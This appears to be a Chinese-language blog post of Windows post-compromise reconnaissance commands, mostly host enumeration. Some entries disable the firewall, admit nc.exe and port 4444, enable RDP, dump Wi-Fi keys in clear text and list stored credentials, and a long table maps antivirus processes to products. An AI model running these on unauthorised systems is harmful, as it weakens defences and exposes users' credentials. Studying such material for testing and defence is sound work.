alt="image-20221229195401317"></p><h2 id="用户列表信息"><a href="#用户列表信息" class="headerlink" title="用户列表信息"></a>用户列表信息</h2><pre class="line-numbers language-none"><code class="language-none">net user wmic useraccount get name ,SID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221229195442775.png" alt="image-20221229195442775"></p><h2 id="列出会话"><a href="#列出会话" class="headerlink" title="列出会话"></a>列出会话</h2><pre class="line-numbers language-none"><code class="language-none">net session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229195616297.png" alt="image-20221229195616297"></p><h2 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h2><pre class="line-numbers language-none"><code class="language-none">netstat ‐ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229195715745.png" alt="image-20221229195715745"></p><h2 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h2><pre class="line-numbers language-none"><code class="language-none">systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20221229195750197.png" alt="image-20221229195750197"></p><h2 id="查询共享列表"><a href="#查询共享列表" class="headerlink" title="查询共享列表"></a>查询共享列表</h2><pre class="line-numbers language-none"><code class="language-none">net share wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221229195822289.png" alt="image-20221229195822289"></p><h2 id="路由信息"><a href="#路由信息" class="headerlink" title="路由信息"></a>路由信息</h2><pre class="line-numbers language-none"><code class="language-none">route print<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221229195847592.png" alt="image-20221229195847592"></p><h2 id="防火墙相关操作"><a href="#防火墙相关操作" class="headerlink" title="防火墙相关操作"></a>防火墙相关操作</h2><h3 id="1、查看防火墙是否开启"><a href="#1、查看防火墙是否开启" class="headerlink" title="1、查看防火墙是否开启"></a>1、查看防火墙是否开启</h3><pre class="line-numbers language-none"><code class="language-none">netsh firewall show state<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230111044017.png" alt="image-20221230111044017"></p><h3 id="2、关闭防火墙"><a href="#2、关闭防火墙" class="headerlink" title="2、关闭防火墙"></a>2、关闭防火墙</h3><pre class="line-numbers language-none"><code class="language-none">Windows server 2003: netsh firewall set opmode disableWindows server 2003之后: netsh firewall set opmode disable 或者netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230111120837.png" alt="image-20221230111120837"></p><h3 id="3、查看防火墙配置"><a href="#3、查看防火墙配置" class="headerlink" title="3、查看防火墙配置"></a>3、查看防火墙配置</h3><pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230111146131.png" alt="image-20221230111146131"></p><h3 id="4、修改防火墙配置"><a href="#4、修改防火墙配置" class="headerlink" title="4、修改防火墙配置"></a>4、修改防火墙配置</h3><h4 id="2003及之前的版本-允许指定的程序进行全部的连接："><a href="#2003及之前的版本-允许指定的程序进行全部的连接：" class="headerlink" title="2003及之前的版本,允许指定的程序进行全部的连接："></a>2003及之前的版本,允许指定的程序进行全部的连接：</h4><pre class="line-numbers language-none"><code class="language-none">netsh firewall add allowedprogram c:\nc.exe "allownc" enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2003之后的版本，允许指定的程序进行全部的连接"><a href="#2003之后的版本，允许指定的程序进行全部的连接" class="headerlink" title="2003之后的版本，允许指定的程序进行全部的连接"></a>2003之后的版本，允许指定的程序进行全部的连接</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="允许指定程序退出"><a href="#允许指定程序退出" class="headerlink" title="允许指定程序退出"></a>允许指定程序退出</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:\nc.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="允许端口-程序放行"><a href="#允许端口-程序放行" class="headerlink" title="允许端口,程序放行"></a>允许端口,程序放行</h4><pre class="line-numbers language-none"><code class="language-none">#允许3389端口放行netsh advfirewall firewall add rule name="RemoteDesktop" protocol=TCP dir=in localport=3389 action=allow#允许4444端口进站netsh advfirewall firewall add rule name=test dir=in action=allow protocol=tcp localport=4444#允许a.exe进站netsh advfirewall firewall add rule name=test dir=in action=allow program=c:\a.exe #允许4444端口出站 netsh advfirewall firewall add rule name=test dir=out action=allow protocol=tcp localport=4444#允许a.exe出站netsh advfirewall firewall add rule name=test dir=out action=allow program=c:\a.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="开启远程服务"><a href="#开启远程服务" class="headerlink" title="开启远程服务"></a>开启远程服务</h2><h3 id="1、在2003机器上"><a href="#1、在2003机器上" class="headerlink" title="1、在2003机器上"></a>1、在2003机器上</h3><pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (_CLASS !="") call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、在server2008和server-2021"><a href="#2、在server2008和server-2021" class="headerlink" title="2、在server2008和server 2021"></a>2、在server2008和server 2021</h3><pre class="line-numbers language-none"><code class="language-none">#开启REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f #关闭REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WIFI密码收集"><a href="#WIFI密码收集" class="headerlink" title="WIFI密码收集"></a>WIFI密码收集</h2><pre class="line-numbers language-none"><code class="language-none">for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr ‐i ‐v echo | netsh wlan show profiles %j key=clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230114955543.png" alt="image-20221230114955543"></p><h2 id="查询RDP端口"><a href="#查询RDP端口" class="headerlink" title="查询RDP端口"></a>查询RDP端口</h2><pre class="line-numbers language-none"><code class="language-none">reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>0xd3d即为3389端口</p><p><img src="assets/image-20221230115028379.png" alt="image-20221230115028379"></p><h2 id="查看代理配置信息"><a href="#查看代理配置信息" class="headerlink" title="查看代理配置信息"></a>查看代理配置信息</h2><pre class="line-numbers language-none"><code class="language-none">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115102879.png" alt="image-20221230115102879"></p><h2 id="查看当前保存的登陆凭证"><a href="#查看当前保存的登陆凭证" class="headerlink" title="查看当前保存的登陆凭证"></a>查看当前保存的登陆凭证</h2><pre class="line-numbers language-none"><code class="language-none">cmdkey /l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Arp信息"><a href="#Arp信息" class="headerlink" title="Arp信息"></a>Arp信息</h2><pre class="line-numbers language-none"><code class="language-none">arp ‐a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115149361.png" alt="image-20221230115149361"></p><h2 id="查看最近打开的文档"><a href="#查看最近打开的文档" class="headerlink" title="查看最近打开的文档"></a>查看最近打开的文档</h2><pre class="line-numbers language-none"><code class="language-none">dir %APPDATA%\Microsoft\Windows\Recent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="查询本机用户组"><a href="#查询本机用户组" class="headerlink" title="查询本机用户组"></a>查询本机用户组</h2><pre class="line-numbers language-none"><code class="language-none">net localgroup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115233367.png" alt="image-20221230115233367"></p><h2 id="管理员组成员列表"><a href="#管理员组成员列表" class="headerlink" title="管理员组成员列表"></a>管理员组成员列表</h2><pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115300712.png" alt="image-20221230115300712"></p><h2 id="RDP凭证"><a href="#RDP凭证" class="headerlink" title="RDP凭证"></a>RDP凭证</h2><pre class="line-numbers language-none"><code class="language-none">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230115337258.png" alt="image-20221230115337258"></p><h2 id="浏览器密码获取"><a href="#浏览器密码获取" class="headerlink" title="浏览器密码获取"></a>浏览器密码获取</h2><h2 id="杀毒软件查询"><a href="#杀毒软件查询" class="headerlink" title="杀毒软件查询"></a>杀毒软件查询</h2><pre class="line-numbers language-none"><code class="language-none">wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="常见杀软程序"><a href="#常见杀软程序" class="headerlink" title="常见杀软程序"></a>常见杀软程序</h3><pre class="line-numbers language-none"><code class="language-none">avList = {"360tray.exe": "360安全卫士‐实时保护","360safe.exe": "360安全卫士‐主程序","ZhuDongFangYu.exe": "360安全卫士‐主动防御","360sd.exe": "360杀毒","a2guard.exe": "a‐squared杀毒","ad‐watch.exe": "Lavasoft杀毒","cleaner8.exe": "The Cleaner杀毒","vba32lder.exe": "vb32杀毒","MongoosaGUI.exe": "Mongoosa杀毒","CorantiControlCenter32.exe": "Coranti2012杀毒","F‐PROT.exe": "F‐Prot AntiVirus","CMCTrayIcon.exe": "CMC杀毒","K7TSecurity.exe": "K7杀毒","UnThreat.exe": "UnThreat杀毒","CKSoftShiedAntivirus4.exe": "Shield Antivirus杀毒","AVWatchService.exe": "VIRUSfighter杀毒","ArcaTasksService.exe": "ArcaVir杀毒","iptray.exe": "Immunet杀毒","PSafeSysTray.exe": "PSafe杀毒","nspupsvc.exe": "nProtect杀毒","SpywareTerminatorShield.exe": "SpywareTerminator反间谍软件","BKavService.exe": "Bkav杀毒","MsMpEng.exe": "Microsoft Security Essentials","SBAMSvc.exe": "VIPRE","ccSvcHst.exe": "Norton杀毒","f‐secure.exe": "冰岛","avp.exe": "Kaspersky","KvMonXP.exe": "江民杀毒","RavMonD.exe": "瑞星杀毒","Mcshield.exe": "McAfee","Tbmon.exe": "McAfee","Frameworkservice.exe": "McAfee","egui.exe": "ESET NOD32","ekrn.exe": "ESET NOD32","eguiProxy.exe": "ESET NOD32","kxetray.exe": "金山毒霸","knsdtray.exe": "可牛杀毒","TMBMSRV.exe": "趋势杀毒","avcenter.exe": "Avira(小红伞)","avguard.exe": "Avira(小红伞)","avgnt.exe": "Avira(小红伞)","sched.exe": "Avira(小红伞)","ashDisp.exe": "Avast网络安全","rtvscan.exe": "诺顿杀毒","ccapp.exe": "SymantecNorton","NPFMntor.exe": "Norton杀毒软件","ccSetMgr.exe": "赛门铁克","ccRegVfy.exe": "Norton杀毒软件","ksafe.exe": "金山卫士","QQPCRTP.exe": "QQ电脑管家","avgwdsvc.exe": "AVG杀毒","QUHLPSVC.exe": "QUICK HEAL杀毒","mssecess.exe": "微软杀毒","SavProgress.exe": "Sophos杀毒","SophosUI.exe": "Sophos杀毒","SophosFS.exe": "Sophos杀毒","SophosHealth.exe": "Sophos杀毒","SophosSafestore64.exe": "Sophos杀毒","SophosCleanM.exe": "Sophos杀毒","fsavgui.exe": "F‐Secure杀毒","vsserv.exe": "比特梵德","remupd.exe": "熊猫卫士","FortiTray.exe": "飞塔","safedog.exe": "安全狗","parmor.exe": "木马克星","Iparmor.exe.exe": "木马克星","beikesan.exe": "贝壳云安全","KSWebShield.exe": "金山网盾","TrojanHunter.exe": "木马猎手","GG.exe": "巨盾网游安全盾","adam.exe": "绿鹰安全精灵","AST.exe": "超级巡警","ananwidget.exe": "墨者安全专家","AVK.exe": "AntiVirusKit","avg.exe": "AVG Anti‐Virus","spidernt.exe": "Dr.web","avgaurd.exe": "Avira Antivir","vsmon.exe": "Zone Alarm","cpf.exe": "Comodo","outpost.exe": "Outpost Firewall","rfwmain.exe": "瑞星防火墙","kpfwtray.exe": "金山网镖","FYFireWall.exe": "风云防火墙","MPMon.exe": "微点主动防御","pfw.exe": "天网防火墙","BaiduSdSvc.exe": "百度杀毒‐服务进程","BaiduSdTray.exe": "百度杀毒‐托盘进程","BaiduSd.exe": "百度杀毒‐主程序","SafeDogGuardCenter.exe": "安全狗","safedogupdatecenter.exe": "安全狗","safedogguardcenter.exe": "安全狗","SafeDogSiteIIS.exe": "安全狗","SafeDogTray.exe": "安全狗","SafeDogServerUI.exe": "安全狗","D_Safe_Manage.exe": "D盾","d_manage.exe": "D盾","yunsuo_agent_service.exe": "云锁","yunsuo_agent_daemon.exe": "云锁","HwsPanel.exe": "护卫神","hws_ui.exe": "护卫神","hws.exe": "护卫神","hwsd.exe": "护卫神","hipstray.exe": "火绒","wsctrl.exe": "火绒","usysdiag.exe": "火绒","SPHINX.exe": "SPHINX防火墙","bddownloader.exe": "百度卫士","baiduansvx.exe": "百度卫士‐主进程","AvastUI.exe": "Avast!5主程序","emet_agent.exe": "EMET","emet_service.exe": "EMET","firesvc.exe": "McAfee","firetray.exe": "McAfee","hipsvc.exe": "McAfee","mfevtps.exe": "McAfee","mcafeefire.exe": "McAfee","scan32.exe": "McAfee","shstat.exe": "McAfee","vstskmgr.exe": "McAfee","engineserver.exe": "McAfee","mfeann.exe": "McAfee","mcscript.exe": "McAfee","updaterui.exe": "McAfee","udaterui.exe": "McAfee","naprdmgr.exe": "McAfee","cleanup.exe": "McAfee","cmdagent.exe": "McAfee","frminst.exe": "McAfee","mcscript_inuse.exe": "McAfee","mctray.exe": "McAfee","_avp32.exe": "卡巴斯基","_avpcc.exe": "卡巴斯基","_avpm.exe": "卡巴斯基","aAvgApi.exe": "AVG","ackwin32.exe": "已知杀软进程,名称暂未收录","alertsvc.exe": "Norton AntiVirus","alogserv.exe": "McAfee VirusScan","anti‐trojan.exe": "Anti‐Trojan Elite","arr.exe": "Application Request Route","atguard.exe": "AntiVir","atupdater.exe": "已知杀软进程,名称暂未收录","atwatch.exe": "Mustek","au.exe": "NSIS","aupdate.exe": "Symantec","auto‐protect.nav80try.exe": "已知杀软进程,名称暂未收录","autodown.exe": "AntiVirus AutoUpdater","avconsol.exe": "McAfee","avgcc32.exe": "AVG","avgctrl.exe": "AVG","avgemc.exe": "AVG","avgrsx.exe": "AVG","avgserv.exe": "AVG","avgserv9.exe": "AVG","avgw.exe": "AVG","avkpop.exe": "G DATA SOFTWARE AG","avkserv.exe": "G DATA SOFTWARE AG","avkservice.exe": "G DATA SOFTWARE AG","avkwctl9.exe": "G DATA SOFTWARE AG","avltmain.exe": "Panda Software Aplication","avnt.exe": "H+BEDV Datentechnik GmbH","avp32.exe": "Kaspersky Anti‐Virus","avpcc.exe": " Kaspersky AntiVirus","avpdos32.exe": " Kaspersky AntiVirus","avpm.exe": " Kaspersky AntiVirus","avptc32.exe": " Kaspersky AntiVirus","avpupd.exe": " Kaspersky AntiVirus","avsynmgr.exe": "McAfee","avwin.exe": " H+BEDV","bargains.exe": "Exact Advertising SpyWare","beagle.exe": "Avast","blackd.exe": "BlackICE","blackice.exe": "BlackICE","blink.exe": "micromedia","blss.exe": "CBlaster","bootwarn.exe": "Symantec","bpc.exe": "Grokster","brasil.exe": "Exact Advertising","ccevtmgr.exe": "Norton Internet Security","cdp.exe": "CyberLink Corp.","cfd.exe": "Motive Communications","cfgwiz.exe": " Norton AntiVirus","claw95.exe": "已知杀软进程,名称暂未收录","claw95cf.exe": "已知杀软进程,名称暂未收录","clean.exe": "windows流氓软件清理大师","cleaner.exe": "windows流氓软件清理大师","cleaner3.exe": "windows流氓软件清理大师","cleanpc.exe": "windows流氓软件清理大师","cpd.exe": "McAfee","ctrl.exe": "已知杀软进程,名称暂未收录","cv.exe": "已知杀软进程,名称暂未收录","defalert.exe": "Symantec","defscangui.exe": "Symantec","defwatch.exe": "Norton Antivirus","doors.exe": "已知杀软进程,名称暂未收录","dpf.exe": "已知杀软进程,名称暂未收录","dpps2.exe": "PanicWare","dssagent.exe": "Broderbund","ecengine.exe": "已知杀软进程,名称暂未收录","emsw.exe": "Alset Inc","ent.exe": "已知杀软进程,名称暂未收录","espwatch.exe": "已知杀软进程,名称暂未收录","ethereal.exe": "RationalClearCase","exe.avxw.exe": "已知杀软进程,名称暂未收录","expert.exe": "已知杀软进程,名称暂未收录","f‐prot95.exe": "已知杀软进程,名称暂未收录","fameh32.exe": "F‐Secure","fast.exe": " FastUsr","fch32.exe": "F‐Secure","fih32.exe": "F‐Secure","findviru.exe": "F‐Secure","firewall.exe": "AshampooSoftware","fnrb32.exe": "F‐Secure","fp‐win.exe": " F‐Prot Antivirus OnDemand","fsaa.exe": "F‐Secure","fsav.exe": "F‐Secure","fsav32.exe": "F‐Secure","fsav530stbyb.exe": "F‐Secure","fsav530wtbyb.exe": "F‐Secure","fsav95.exe": "F‐Secure","fsgk32.exe": "F‐Secure","fsm32.exe": "F‐Secure","fsma32.exe": "F‐Secure","fsmb32.exe": "F‐Secure","gbmenu.exe": "已知杀软进程,名称暂未收录","guard.exe": "ewido","guarddog.exe": "ewido","htlog.exe": "已知杀软进程,名称暂未收录","htpatch.exe": "Silicon Integrated Systems Corporation","hwpe.exe": "已知杀软进程,名称暂未收录","iamapp.exe": "Symantec","iamserv.exe": "Symantec","iamstats.exe": "Symantec","iedriver.exe": " Urlblaze.com","iface.exe": "Panda Antivirus Module","infus.exe": "Infus Dialer","infwin.exe": "Msviewparasite","intdel.exe": "Inet Delivery","intren.exe": "已知杀软进程,名称暂未收录","jammer.exe": "已知杀软进程,名称暂未收录","kavpf.exe": "Kapersky","kazza.exe": "Kapersky","keenvalue.exe": "EUNIVERSE INC","launcher.exe": "Intercort Systems","ldpro.exe": "已知杀软进程,名称暂未收录","ldscan.exe": "Windows Trojans Inspector","localnet.exe": "已知杀软进程,名称暂未收录","luall.exe": "Symantec","luau.exe": "Symantec","lucomserver.exe": "Norton","mcagent.exe": "McAfee","mcmnhdlr.exe": "McAfee","mctool.exe": "McAfee","mcupdate.exe": "McAfee","mcvsrte.exe": "McAfee","mcvsshld.exe": "McAfee","mfin32.exe": "MyFreeInternetUpdate","mfw2en.exe": "MyFreeInternetUpdate","mfweng3.02d30.exe": "MyFreeInternetUpdate","mgavrtcl.exe": "McAfee","mgavrte.exe": "McAfee","mghtml.exe": "McAfee","mgui.exe": "BullGuard","minilog.exe": "Zone Labs Inc","mmod.exe": "EzulaInc","mostat.exe": "WurldMediaInc","mpfagent.exe": "McAfee","mpfservice.exe": "McAfee","mpftray.exe": "McAfee","mscache.exe": "Integrated Search Technologies Spyware","mscman.exe": "OdysseusMarketingInc","msmgt.exe": "Total Velocity Spyware","msvxd.exe": "W32/Datom‐A","mwatch.exe": "已知杀软进程,名称暂未收录","nav.exe": "Reuters Limited","navapsvc.exe": "Norton AntiVirus","navapw32.exe": "Norton AntiVirus","navw32.exe": "Norton Antivirus","ndd32.exe": "诺顿磁盘医生","neowatchlog.exe": "已知杀软进程,名称暂未收录","netutils.exe": "已知杀软进程,名称暂未收录","nisserv.exe": "Norton","nisum.exe": "Norton","nmain.exe": "Norton","nod32.exe": "ESET Smart Security","norton_internet_secu_3.0_407.exe": "已知杀软进程,名称暂未收录","notstart.exe": "已知杀软进程,名称暂未收录","nprotect.exe": "Symantec","npscheck.exe": "Norton","npssvc.exe": "Norton","ntrtscan.exe": "趋势反病毒应用程序","nui.exe": "已知杀软进程,名称暂未收录","otfix.exe": "已知杀软进程,名称暂未收录","outpostinstall.exe": "Outpost","patch.exe": "趋势科技","pavw.exe": "已知杀软进程,名称暂未收录","pcscan.exe": "趋势科技","pdsetup.exe": "已知杀软进程,名称暂未收录","persfw.exe": "Tiny Personal Firewall","pgmonitr.exe": "PromulGate SpyWare","pingscan.exe": "已知杀软进程,名称暂未收录","platin.exe": "已知杀软进程,名称暂未收录","pop3trap.exe": "PC‐cillin","poproxy.exe": "NortonAntiVirus","popscan.exe": "已知杀软进程,名称暂未收录","powerscan.exe": "Integrated Search Technologies","ppinupdt.exe": "已知杀软进程,名称暂未收录","pptbc.exe": "已知杀软进程,名称暂未收录","ppvstop.exe": "已知杀软进程,名称暂未收录","prizesurfer.exe": "Prizesurfer","prmt.exe": "OpiStat","prmvr.exe": "Adtomi","processmonitor.exe": "Sysinternals","proport.exe": "已知杀软进程,名称暂未收录","protectx.exe": "ProtectX","pspf.exe": "已知杀软进程,名称暂未收录","purge.exe": "已知杀软进程,名称暂未收录","qconsole.exe": "Norton AntiVirus Quarantine Console","qserver.exe": "Norton Internet Security","rapapp.exe": "BlackICE","rb32.exe": "RapidBlaster","rcsync.exe": "PrizeSurfer","realmon.exe": "Realmon ","rescue.exe": "已知杀软进程,名称暂未收录","rescue32.exe": "卡巴斯基互联网安全套装","rshell.exe": "已知杀软进程,名称暂未收录","rtvscn95.exe": "Real‐time virus scanner ","rulaunch.exe": "McAfee User Interface","run32dll.exe": "PAL PC Spy","safeweb.exe": "PSafe Tecnologia","sbserv.exe": "Norton Antivirus","scrscan.exe": "360杀毒","sfc.exe": "System file checker","sh.exe": "MKS Toolkit for Win3","showbehind.exe": "MicroSmarts Enterprise Component ","soap.exe": "System Soap Pro","sofi.exe": "已知杀软进程,名称暂未收录","sperm.exe": "已知杀软进程,名称暂未收录","supporter5.exe": "eScorcher反病毒","symproxysvc.exe": "Symantec","symtray.exe": "Symantec","tbscan.exe": "ThunderBYTE","tc.exe": "TimeCalende","titanin.exe": "TitanHide","tvmd.exe": "Total Velocity","tvtmd.exe": " Total Velocity","vettray.exe": "eTrust","vir‐help.exe": "已知杀软进程,名称暂未收录","vnpc3000.exe": "已知杀软进程,名称暂未收录","vpc32.exe": "Symantec","vpc42.exe": "Symantec","vshwin32.exe": "McAfee","vsmain.exe": "McAfee","vsstat.exe": "McAfee","wfindv32.exe": "已知杀软进程,名称暂未收录","zapro.exe": "Zone Alarm","zonealarm.exe": "Zone Alarm","AVPM.exe": "Kaspersky","A2CMD.exe": "Emsisoft Anti‐Malware","A2SERVICE.exe": "a‐squared free","A2FREE.exe": "a‐squared Free","ADVCHK.exe": "Norton AntiVirus","AGB.exe": "安天防线","AHPROCMONSERVER.exe": "安天防线","AIRDEFENSE.exe": "AirDefense","ALERTSVC.exe": "Norton AntiVirus","AVIRA.exe": "小红伞杀毒","AMON.exe": "Tiny Personal Firewall","AVZ.exe": "AVZ","ANTIVIR.exe": "已知杀软进程,名称暂未收录","APVXDWIN.exe": "熊猫卫士","ASHMAISV.exe": "Alwil","ASHSERV.exe": "Avast Anti‐virus","ASHSIMPL.exe": "AVAST!VirusCleaner","ASHWEBSV.exe": "Avast","ASWUPDSV.exe": "Avast","ASWSCAN.exe": "Avast","AVCIMAN.exe": "熊猫卫士","AVCONSOL.exe": "McAfee","AVENGINE.exe": "熊猫卫士","AVESVC.exe": "Avira AntiVir Security Service","AVEVL32.exe": "已知杀软进程,名称暂未收录","AVGAM.exe": "AVG","AVGCC.exe": "AVG","AVGCHSVX.exe": "AVG","AVGCSRVX": "AVG","AVGNSX.exe": "AVG","AVGCC32.exe": "AVG","AVGCTRL.exe": "AVG","AVGEMC.exe": "AVG","AVGFWSRV.exe": "AVG","AVGNTMGR.exe": "AVG","AVGSERV.exe": "AVG","AVGTRAY.exe": "AVG","AVGUPSVC.exe": "AVG","AVINITNT.exe": "Command AntiVirus for NT Server","AVPCC.exe": "Kaspersky","AVSERVER.exe": "Kerio MailServer","AVSCHED32.exe": "H+BEDV","AVSYNMGR.exe": "McAfee","AVWUPSRV.exe": "H+BEDV","BDSWITCH.exe": "BitDefender Module","BLACKD.exe": "BlackICE","CCEVTMGR.exe": "Symantec","CFP.exe": "COMODO","CLAMWIN.exe": "ClamWin Portable","CUREIT.exe": "DrWeb CureIT","DEFWATCH.exe": "Norton Antivirus","DRWADINS.exe": "Dr.Web","DRWEB.exe": "Dr.Web","DEFENDERDAEMON.exe": "ShadowDefender","EWIDOCTRL.exe": "Ewido Security Suite","EZANTIVIRUSREGISTRATIONCHECK.exe": "e‐Trust Antivirus","FIREWALL.exe": "AshampooSoftware","FPROTTRAY.exe": "F‐PROT Antivirus","FPWIN.exe": "Verizon","FRESHCLAM.exe": "ClamAV","FSAV32.exe": "F‐Secure","FSBWSYS.exe": "F‐secure","FSDFWD.exe": "F‐Secure","FSGK32.exe": "F‐Secure","FSGK32ST.exe": "F‐Secure","FSMA32.exe": "F‐Secure","FSMB32.exe": "F‐Secure","FSSM32.exe": "F‐Secure","GUARDGUI.exe": "网游保镖","GUARDNT.exe": "IKARUS","IAMAPP.exe": "Symantec","INOCIT.exe": "eTrust","INORPC.exe": "eTrust","INORT.exe": "eTrust","INOTASK.exe": "eTrust","INOUPTNG.exe": "eTrust","ISAFE.exe": "eTrust","KAV.exe": "Kaspersky","KAVMM.exe": "Kaspersky","KAVPF.exe": "Kaspersky","KAVPFW.exe": "Kaspersky","KAVSTART.exe": "Kaspersky","KAVSVC.exe": "Kaspersky","KAVSVCUI.exe": "Kaspersky","KMAILMON.exe": "金山毒霸","MCAGENT.exe": "McAfee","MCMNHDLR.exe": "McAfee","MCREGWIZ.exe": "McAfee","MCUPDATE.exe": "McAfee","MCVSSHLD.exe": "McAfee","MINILOG.exe": "Zone Alarm","MYAGTSVC.exe": "McAfee","MYAGTTRY.exe": "McAfee","NAVAPSVC.exe": "Norton","NAVAPW32.exe": "Norton","NAVLU32.exe": "Norton","NAVW32.exe": "Norton Antivirus","NEOWATCHLOG.exe": "NeoWatch","NEOWATCHTRAY.exe": "NeoWatch","NISSERV.exe": "Norton","NISUM.exe": "Norton","NMAIN.exe": "Norton","NOD32.exe": "ESET NOD32","NPFMSG.exe": "Norman个人防火墙","NPROTECT.exe": "Symantec","NSMDTR.exe": "Norton","NTRTSCAN.exe": "趋势科技","OFCPFWSVC.exe": "OfficeScanNT","ONLINENT.exe": "已知杀软进程,名称暂未收录","OP_MON.exe": " OutpostFirewall","PAVFIRES.exe": "熊猫卫士","PAVFNSVR.exe": "熊猫卫士","PAVKRE.exe": "熊猫卫士","PAVPROT.exe": "熊猫卫士","PAVPROXY.exe": "熊猫卫士","PAVPRSRV.exe": "熊猫卫士","PAVSRV51.exe": "熊猫卫士","PAVSS.exe": "熊猫卫士","PCCGUIDE.exe": "PC‐cillin","PCCIOMON.exe": "PC‐cillin","PCCNTMON.exe": "PC‐cillin","PCCPFW.exe": "趋势科技","PCCTLCOM.exe": "趋势科技","PCTAV.exe": "PC Tools AntiVirus","PERSFW.exe": "Tiny Personal Firewall","PERVAC.exe": "已知杀软进程,名称暂未收录","PESTPATROL.exe": "Ikarus","PREVSRV.exe": "熊猫卫士","RTVSCN95.exe": "Real‐time Virus Scanner","SAVADMINSERVICE.exe": "SAV","SAVMAIN.exe": "SAV","SAVSCAN.exe": "SAV","SDHELP.exe": "Spyware Doctor","SHSTAT.exe": "McAfee","SPBBCSVC.exe": "Symantec","SPIDERCPL.exe": "Dr.Web","SPIDERML.exe": "Dr.Web","SPIDERUI.exe": "Dr.Web","SPYBOTSD.exe": "Spybot ","SWAGENT.exe": "SonicWALL","SWDOCTOR.exe": "SonicWALL","SWNETSUP.exe": "Sophos","SYMLCSVC.exe": "Symantec","SYMPROXYSVC.exe": "Symantec","SYMSPORT.exe": "Sysmantec","SYMWSC.exe": "Sysmantec","SYNMGR.exe": "Sysmantec","TMLISTEN.exe": "趋势科技","TMNTSRV.exe": "趋势科技","TMPROXY.exe": "趋势科技","TNBUTIL.exe": "Anti‐Virus","VBA32ECM.exe": "已知杀软进程,名称暂未收录","VBA32IFS.exe": "已知杀软进程,名称暂未收录","VBA32PP3.exe": "已知杀软进程,名称暂未收录","VCRMON.exe": "VirusChaser","VRMONNT.exe": "HAURI","VRMONSVC.exe": "HAURI","VSHWIN32.exe": "McAfee","VSSTAT.exe": "McAfee","XCOMMSVR.exe": "BitDefender","ZONEALARM.exe": "Zone Alarm","360rp.exe": "360杀毒","afwServ.exe": " Avast Antivirus ","safeboxTray.exe": "360杀毒","360safebox.exe": "360杀毒","QQPCTray.exe": "QQ电脑管家","KSafeTray.exe": "金山毒霸","KSafeSvc.exe": "金山毒霸","KWatch.exe": "金山毒霸","gov_defence_service.exe": "云锁","gov_defence_daemon.exe": "云锁","smartscreen.exe": "Windows Defender"};<span aria-hidden="true" 